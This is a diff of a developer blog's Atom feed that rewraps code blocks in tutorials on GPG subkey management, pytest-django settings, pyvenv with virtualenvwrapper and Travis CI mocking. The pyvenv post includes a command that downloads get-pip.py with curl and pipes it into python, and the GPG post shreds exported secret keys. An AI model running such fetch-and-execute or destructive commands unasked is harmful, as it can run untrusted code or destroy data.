 sub  4096R/&lt;span class="o"&gt;[&lt;/span&gt;Sub ID&lt;span class="o"&gt;]&lt;/span&gt;  created: &lt;span class="m"&gt;2017&lt;/span&gt;-04-17  expires: never       usage: E   &lt;span class="o"&gt;]&lt;/span&gt;
 
 gpg&amp;gt; &lt;span class="c1"&gt;# save&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;h2&gt;Create a signing subkey&lt;/h2&gt;
 &lt;p&gt;When creating a key GPG automatically creates an encryption subkey as well, which means that only the signing subkey needs manual creation.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ gpg --edit-key &lt;span class="o"&gt;[&lt;/span&gt;Your email address&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ gpg --edit-key &lt;span class="o"&gt;[&lt;/span&gt;Your email address&lt;span class="o"&gt;]&lt;/span&gt;
 gpg &lt;span class="o"&gt;(&lt;/span&gt;GnuPG&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;.4.11&lt;span class="p"&gt;;&lt;/span&gt; Copyright &lt;span class="o"&gt;(&lt;/span&gt;C&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;2010&lt;/span&gt; Free Software Foundation, Inc.
 This is free software: you are free to change and redistribute it.
 There is NO WARRANTY, to the extent permitted by law.
@@ -308,12 +344,12 @@ sub  4096R/&lt;span class="o"&gt;[&lt;/span&gt;Sub ID&lt;span class="o"&gt;]&lt;
 sub  4096R/&lt;span class="o"&gt;[&lt;/span&gt;Sub ID&lt;span class="o"&gt;]&lt;/span&gt;  created: &lt;span class="m"&gt;2017&lt;/span&gt;-04-17  expires: never       usage: S
 
 gpg&amp;gt; &lt;span class="c1"&gt;# save &amp;lt;--&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;h2&gt;Create a revocation certificate&lt;/h2&gt;
 &lt;p&gt;If the master key gets lost or compromised, the revocation certificate is going to be your emergency brake.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ gpg --output revoke.asc --gen-revoke &lt;span class="o"&gt;[&lt;/span&gt;your email address&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ gpg --output revoke.asc --gen-revoke &lt;span class="o"&gt;[&lt;/span&gt;your email address&lt;span class="o"&gt;]&lt;/span&gt;
 Create a revocation certificate &lt;span class="k"&gt;for&lt;/span&gt; this key? &lt;span class="o"&gt;(&lt;/span&gt;y/N&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# y &amp;lt;--&lt;/span&gt;
 Please &lt;span class="k"&gt;select&lt;/span&gt; the reason &lt;span class="k"&gt;for&lt;/span&gt; the revocation:
   &lt;span class="nv"&gt;0&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; No reason specified
@@ -335,30 +371,30 @@ user: &lt;span class="o"&gt;[&lt;/span&gt;Your name&lt;span class="o"&gt;]&lt;/s
 &lt;span class="c1"&gt;# Enter passphrase &amp;lt;--&lt;/span&gt;
 
 Revocation certificate created.
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Make several copies of it and save it in a safe place (ideally not the same one as the master key!)&lt;/p&gt;
 &lt;h2&gt;Remove the master key&lt;/h2&gt;
 &lt;p&gt;Before proceeding, make sure to have backups of the &lt;code&gt;.gpg&lt;/code&gt; folder (perhaps on an encrypted media)&lt;/p&gt;
 &lt;p&gt;Temporarily export the subkeys:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ gpg --export-secret-subkeys &lt;span class="o"&gt;[&lt;/span&gt;your email address&lt;span class="o"&gt;]&lt;/span&gt; &amp;gt; /media/encrypted-media/subkeys
-&lt;/pre&gt;&lt;/div&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ gpg --export-secret-subkeys &lt;span class="o"&gt;[&lt;/span&gt;your email address&lt;span class="o"&gt;]&lt;/span&gt; &amp;gt; /media/encrypted-media/subkeys
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Delete the master key:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ gpg --delete-secret-key 0x6F87F32E2234961E
-&lt;/pre&gt;&lt;/div&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ gpg --delete-secret-key 0x6F87F32E2234961E
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Re-import the subkeys and remove the temporary export:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ gpg --import /media/encrypted-usb/subkeys
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ gpg --import /media/encrypted-usb/subkeys
 $ shred -u /media/encrypted-usb/subkeys
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Check that everything worked as intended - the hash (#) next to the &lt;code&gt;sec&lt;/code&gt; line means that the master key is missing.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ gpg -K &lt;span class="o"&gt;[&lt;/span&gt;your email address&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ gpg -K &lt;span class="o"&gt;[&lt;/span&gt;your email address&lt;span class="o"&gt;]&lt;/span&gt;
 
 /home/username/.gnupg/secring.gpg
 -----------------------------
@@ -366,19 +402,19 @@ sec#  4096R/&lt;span class="o"&gt;[&lt;/span&gt;Your key ID&lt;span class="o"&gt
 uid                  &lt;span class="o"&gt;[&lt;/span&gt;Your name&lt;span class="o"&gt;]&lt;/span&gt; &amp;lt;&lt;span class="o"&gt;[&lt;/span&gt;your email address&lt;span class="o"&gt;]&lt;/span&gt;&amp;gt;
 ssb   4096R/&lt;span class="o"&gt;[&lt;/span&gt;Subkey ID&lt;span class="o"&gt;]&lt;/span&gt;   &lt;span class="m"&gt;2017&lt;/span&gt;-04-17
 ssb   4096R/&lt;span class="o"&gt;[&lt;/span&gt;Subkey ID&lt;span class="o"&gt;]&lt;/span&gt;   &lt;span class="m"&gt;2017&lt;/span&gt;-04-17
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;h2&gt;Upload the key to a keyserver&lt;/h2&gt;
 &lt;p&gt;Keyservers syncs keys with each other, so any keyserver would do.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ gpg --keyserver pgp.mit.edu --send-key &lt;span class="o"&gt;[&lt;/span&gt;your key ID&lt;span class="o"&gt;]&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ gpg --keyserver pgp.mit.edu --send-key &lt;span class="o"&gt;[&lt;/span&gt;your key ID&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;h2&gt;Using your master key&lt;/h2&gt;
 &lt;p&gt;Assuming that the &lt;code&gt;.gpg&lt;/code&gt; folder is on some kind of encrypted media:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ gpg --homedir&lt;span class="o"&gt;=&lt;/span&gt;/media/encrypted-media/.gnupg/ &lt;span class="o"&gt;[&lt;/span&gt;gpg command&lt;span class="o"&gt;]&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ gpg --homedir&lt;span class="o"&gt;=&lt;/span&gt;/media/encrypted-media/.gnupg/ &lt;span class="o"&gt;[&lt;/span&gt;gpg command&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;h2&gt;Parting thoughts&lt;/h2&gt;
@@ -406,8 +442,8 @@ ssb   4096R/&lt;span class="o"&gt;[&lt;/span&gt;Subkey ID&lt;span class="o"&gt;]
 &lt;h2&gt;Using the &lt;code&gt;--ds&lt;/code&gt; option&lt;/h2&gt;
 &lt;p&gt;This is probably a no-brainer, but the most obvious way to make sure pytest-django picks up the right settings file is to pass the &lt;code&gt;--ds&lt;/code&gt; option when invoking &lt;code&gt;pytest&lt;/code&gt; from the command line.&lt;/p&gt;
 &lt;p&gt;While it certainly works, it adds quite a lot of typing - especially if you use a &lt;a href="https://www.rdegges.com/2011/the-perfect-django-settings-file/"&gt;settings module instead of a single setting file&lt;/a&gt;, since it could easily translate into&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pytest --ds&lt;span class="o"&gt;=&lt;/span&gt;project_folder.settings_folder.settings_file
-&lt;/pre&gt;&lt;/div&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ pytest --ds&lt;span class="o"&gt;=&lt;/span&gt;project_folder.settings_folder.settings_file
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Certainly not something I'd like to do every time I want to run the test suite.&lt;/p&gt;
@@ -417,22 +453,22 @@ ssb   4096R/&lt;span class="o"&gt;[&lt;/span&gt;Subkey ID&lt;span class="o"&gt;]
 &lt;h2&gt;Using &lt;code&gt;addopts&lt;/code&gt; in the &lt;code&gt;pytest.ini&lt;/code&gt; file&lt;/h2&gt;
 &lt;p&gt;Wouldn't be awesome if you could just use the &lt;code&gt;pytest.ini&lt;/code&gt; file, set all the necessary settings in there, and not have to worry ever again? Actually you can, thanks to &lt;a href="http://doc.pytest.org/en/3.0.2/customize.html#confval-addopts"&gt;&lt;code&gt;addopts&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;
 &lt;p&gt;What &lt;code&gt;addopts&lt;/code&gt; does is to add options (hence the double d!) to your test run as if they were specified via command line. So, for example, if you want to update and export coverage every time you run the suite, you would write this in the &lt;code&gt;pytest.ini&lt;/code&gt; file&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;[pytest]&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;[pytest]&lt;/span&gt;
 &lt;span class="na"&gt;addopts&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&lt;/span&gt;
 &lt;span class="s"&gt;    --cov=.&lt;/span&gt;
 &lt;span class="s"&gt;    --cov-report=html&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;and every time you run &lt;code&gt;pytest&lt;/code&gt; it will, behind the scene, be interpreted as if you have run&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pytest --cov&lt;span class="o"&gt;=&lt;/span&gt;. --cov-report&lt;span class="o"&gt;=&lt;/span&gt;html
-&lt;/pre&gt;&lt;/div&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ pytest --cov&lt;span class="o"&gt;=&lt;/span&gt;. --cov-report&lt;span class="o"&gt;=&lt;/span&gt;html
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Thus, by adding &lt;code&gt;--ds=project_folder.settings_folder.settings_file&lt;/code&gt; to &lt;code&gt;addopts&lt;/code&gt; it is possible to override pytest-django discovery order and make sure that the value in the &lt;code&gt;pytest.ini&lt;/code&gt; file gets read instead of environment variable.&lt;/p&gt;
 &lt;p&gt;Ok, but what if you want to point pytest to a different settings file for one run only? No problem! One of the perks of this method is that you can esplicitly pass the &lt;code&gt;--ds&lt;/code&gt; option from the command line to override the one in the &lt;code&gt;pytest.ini&lt;/code&gt; file. So running&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pytest --ds&lt;span class="o"&gt;=&lt;/span&gt;other_settings_file
-&lt;/pre&gt;&lt;/div&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ pytest --ds&lt;span class="o"&gt;=&lt;/span&gt;other_settings_file
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;will just work as usual. Neat!&lt;/p&gt;</content><category term="/dev"></category><category term="django"></category><category term="pytest"></category><category term="pytest-django"></category><category term="environment variables"></category></entry><entry><title>Using pyvenv with virtualenvwrapper</title><link href="https://railslide.io/pyvenv-virtualenvwrapper.html" rel="alternate"></link><published>2016-06-07T00:00:00+02:00</published><updated>2016-06-07T00:00:00+02:00</updated><author><name>Giulia Vergottini</name></author><id>tag:railslide.io,2016-06-07:/pyvenv-virtualenvwrapper.html</id><summary type="html">&lt;p&gt;After reading that it might be possible to use virtualenvwrapper with pyvenv, I decided to fire up a couple of virtual machines and to find it out.&lt;/p&gt;</summary><content type="html">&lt;p&gt;Python 3 ships with pyvenv, a built-in virtualenv manager. Although I welcomed the news as a definitely good one, the absence of a virtualenvwrapper-like tool for pyvenv has always stopped me from giving it a try. I consider virtualenvwrapper to be a super neat tool (I even wrote a plugin for it!) and I don't see why I would want to type the path to my virtual environment activation script every time I want to activate it, when I can just use a way more pythonic &lt;code&gt;workon my_venv&lt;/code&gt;.&lt;/p&gt;
@@ -440,15 +476,15 @@ ssb   4096R/&lt;span class="o"&gt;[&lt;/span&gt;Subkey ID&lt;span class="o"&gt;]
 &lt;h2&gt;The Ubuntu mess&lt;/h2&gt;
 &lt;p&gt;According to Python documentation I should be able to invoke pyvenv by simply calling &lt;code&gt;pyvenv [args]&lt;/code&gt;. However, that is not the case for Ubuntu. Thus, my first attempt to set my &lt;code&gt;VIRTUALENVWRAPPER_VIRTUALENV&lt;/code&gt; variable equal to &lt;code&gt;pyvenv&lt;/code&gt; resulted in my vagrant machine complaining because it could not find it in my path. Setting it to &lt;code&gt;pyvenv-3.4&lt;/code&gt; solved it (I was initially testing on Ubuntu 14.04, which ships with Python 3.4). Though having to manually change it whenever I decide to update my Python version is far from optimal.&lt;/p&gt;
 &lt;p&gt;So I set &lt;code&gt;pyvenv-3.4&lt;/code&gt; as &lt;code&gt;VIRTUALENVWRAPPER_VIRTUALENV&lt;/code&gt;, created a new virtualenv and...&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Error: Command &lt;span class="s1"&gt;&amp;#39;[&amp;#39;&lt;/span&gt;/home/vagrant/.virtualenvs/test/bin/python3.4&lt;span class="s1"&gt;&amp;#39;, &amp;#39;&lt;/span&gt;-Im&lt;span class="s1"&gt;&amp;#39;, &amp;#39;&lt;/span&gt;ensurepip&lt;span class="s1"&gt;&amp;#39;, &amp;#39;&lt;/span&gt;--upgrade&lt;span class="s1"&gt;&amp;#39;, &amp;#39;&lt;/span&gt;--default-pip&lt;span class="s1"&gt;&amp;#39;]&amp;#39;&lt;/span&gt; returned non-zero &lt;span class="nb"&gt;exit&lt;/span&gt; status &lt;span class="m"&gt;1&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;Error: Command &lt;span class="s1"&gt;&amp;#39;[&amp;#39;&lt;/span&gt;/home/vagrant/.virtualenvs/test/bin/python3.4&lt;span class="s1"&gt;&amp;#39;, &amp;#39;&lt;/span&gt;-Im&lt;span class="s1"&gt;&amp;#39;, &amp;#39;&lt;/span&gt;ensurepip&lt;span class="s1"&gt;&amp;#39;, &amp;#39;&lt;/span&gt;--upgrade&lt;span class="s1"&gt;&amp;#39;, &amp;#39;&lt;/span&gt;--default-pip&lt;span class="s1"&gt;&amp;#39;]&amp;#39;&lt;/span&gt; returned non-zero &lt;span class="nb"&gt;exit&lt;/span&gt; status &lt;span class="m"&gt;1&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Ok, not exactly what I was hoping for.&lt;/p&gt;
 &lt;p&gt;After a bit of digging, it came out that it is due &lt;a href="https://bugs.launchpad.net/ubuntu/+source/python3.4/+bug/1290847"&gt;to a bug with ensurepip&lt;/a&gt; in the first release of Ubuntu 14.04. However, it is possible to bypass the problem by first creating the virtualenv without pip and then manually installing it once inside it.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ mkvirtualenv --without-pip my_venv
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ mkvirtualenv --without-pip my_venv
 &lt;span class="o"&gt;(&lt;/span&gt;my_venv&lt;span class="o"&gt;)&lt;/span&gt;$ curl https://bootstrap.pypa.io/get-pip.py &lt;span class="p"&gt;|&lt;/span&gt; python
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Quite a lot to type, plus you have to wait for Pip to install. Definitely not optimal.&lt;/p&gt;
@@ -467,14 +503,14 @@ ssb   4096R/&lt;span class="o"&gt;[&lt;/span&gt;Subkey ID&lt;span class="o"&gt;]
 &lt;li&gt;&lt;code&gt;add2virtualenv&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;don't work and they all raise&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ne"&gt;AttributeError&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;module&amp;#39;&lt;/span&gt; &lt;span class="nb"&gt;object&lt;/span&gt; &lt;span class="n"&gt;has&lt;/span&gt; &lt;span class="n"&gt;no&lt;/span&gt; &lt;span class="n"&gt;attribute&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;sysconfig&amp;#39;&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="ne"&gt;AttributeError&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;module&amp;#39;&lt;/span&gt; &lt;span class="nb"&gt;object&lt;/span&gt; &lt;span class="n"&gt;has&lt;/span&gt; &lt;span class="n"&gt;no&lt;/span&gt; &lt;span class="n"&gt;attribute&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;sysconfig&amp;#39;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;&lt;code&gt;cpvirtualenv&lt;/code&gt; is instead a bit weird, since it does copy the virtualenv, but it displays the name of the original one in front of the prompt of all its copies. Even making copies of a copy doesn't change the result: it still shows the name of the first original. The &lt;code&gt;$VIRTUAL_ENV&lt;/code&gt; variable and the interpreter point to the correct folder tho...&lt;/p&gt;
 &lt;p&gt;Last but not least, is probably worthy mentioning that - by design - pyvenv doesn't offer the possibility to specify a Python interpreter for virtual environments, so&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ mkvirtualenv -p /path/to/python/interpreter my_venv
-&lt;/pre&gt;&lt;/div&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ mkvirtualenv -p /path/to/python/interpreter my_venv
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;no longer works, which means no way to get a Python 2.7 virtualenv out of it.&lt;/p&gt;
@@ -487,24 +523,24 @@ ssb   4096R/&lt;span class="o"&gt;[&lt;/span&gt;Subkey ID&lt;span class="o"&gt;]
 &lt;h2&gt;There's always a first time (for a failure)&lt;/h2&gt;
 &lt;p&gt;Ok, you know the old adage: &lt;em&gt;if it compiles the first time, there must be something wrong&lt;/em&gt;. And in a similar fashion, this first failure didn't come at all as a surprise. Not a big deal. Also, the build for Python 3.4 succeeded, which is good.&lt;/p&gt;
 &lt;p&gt;I checked out the error messages and - of course - it complains because it couldn't find the &lt;code&gt;unittest.mock&lt;/code&gt; module in Python 2. Since I'd rather not add dependencies that are not strictly necessary for setting up the development environment, I was quite happy to read that Travis CI automatically installs mock in its testing environments. So, I wrapped my import statement in a try-except block as such:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
     &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;unittest.mock&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;patch&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;mock_open&lt;/span&gt;
 &lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="ne"&gt;ImportError&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
     &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;mock&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;patch&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;mock_open&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;To be honest, I am not super glad about an import that relies on a non-mandatory dependency, but let's play along for now and let's get Travis up and running - I can always come up with something better on a later moment.&lt;/p&gt;
 &lt;p&gt;Ok so, commit my hack, push, and hold my breath for a handful of seconds. Does it work? Nope.&lt;/p&gt;
 &lt;h2&gt;Builtins, __builtin__, and better mocking decisions&lt;/h2&gt;
 &lt;p&gt;Since Subvenv relies on I/O operations for doing its job, I made sure to mock them away when writing my tests. However, since I use Python 3 as my default, I had initially mocked the &lt;code&gt;open&lt;/code&gt; function like this:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;patch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;builtins.open&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;create&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;patch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;builtins.open&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;create&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;That of course didn't work in Python 2, since there the module is called &lt;code&gt;__builtin__&lt;/code&gt;. So, after a hacky and unsuccessful attempt, I ended up in rewriting my mock in a more specific and robust way. Instead of patching the function within the Builtins module, I patched the function &lt;em&gt;call&lt;/em&gt; made inside my module:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;patch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;subvenv.core.open&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;create&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;patch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;subvenv.core.open&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;create&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;In this way, there's no need to worry about where the function comes from, since all it matters is that it gets called within my module's namespace.&lt;/p&gt;
@@ -515,22 +551,22 @@ ssb   4096R/&lt;span class="o"&gt;[&lt;/span&gt;Subkey ID&lt;span class="o"&gt;]
 &lt;h2&gt;Which mock?&lt;/h2&gt;
 &lt;p&gt;Ok, so back to my mocks! Now they get imported and patch what they need to patch, but still don't seem to work as expected. Or rather, it looks like there's something off with the &lt;code&gt;mock_open&lt;/code&gt; helper, since for some reason it returns a &lt;code&gt;MagicMock&lt;/code&gt; instance instead of the specified &lt;code&gt;read_data&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;After a bit of head scratching and googling, I found a &lt;a href="https://github.com/travis-ci/travis-ci/issues/5849"&gt;feature request&lt;/a&gt; to Travis that shaded light over my own problem. Thanks to it I got to discover that Travis runs an old version of Mock (I haven't figured out which one exactly, but for sure older than 1.3.0) which does not implement &lt;code&gt;mock_open&lt;/code&gt; as later versions do. Thankfully the same issue suggested also a workaround for it, i.e. to add an explicit install command for the desired version to the configuration file:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;install&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nt"&gt;install&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
   &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;pip install .&lt;/span&gt;
   &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;pip install mock==2.0&lt;/span&gt;
   &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;pip install -r requirements.txt&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;h2&gt;Mock and Python 3.3&lt;/h2&gt;
 &lt;p&gt;Ok, after the latest changes, I managed to add Python 2.7 to the list of successful builds. However, Python 3.3 shows up still in red and the error message is basically the same one I got when I add the Mock version issue in Python 2.7. That's weird!&lt;/p&gt;
 &lt;p&gt;Just to be sure, I double checked: yes, Mock is already part of the Unittest module in Python 3.3 and yes, its implementation of the &lt;code&gt;mock_open&lt;/code&gt; does take &lt;code&gt;read_data&lt;/code&gt; as an argument. However, as the documentation specifies, the &lt;code&gt;readline&lt;/code&gt; and &lt;code&gt;readlines&lt;/code&gt; method have been added in version 3.4, hence my error.&lt;/p&gt;
 &lt;p&gt;Ok, let's flip the imports then, so that the external library gets tried first:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
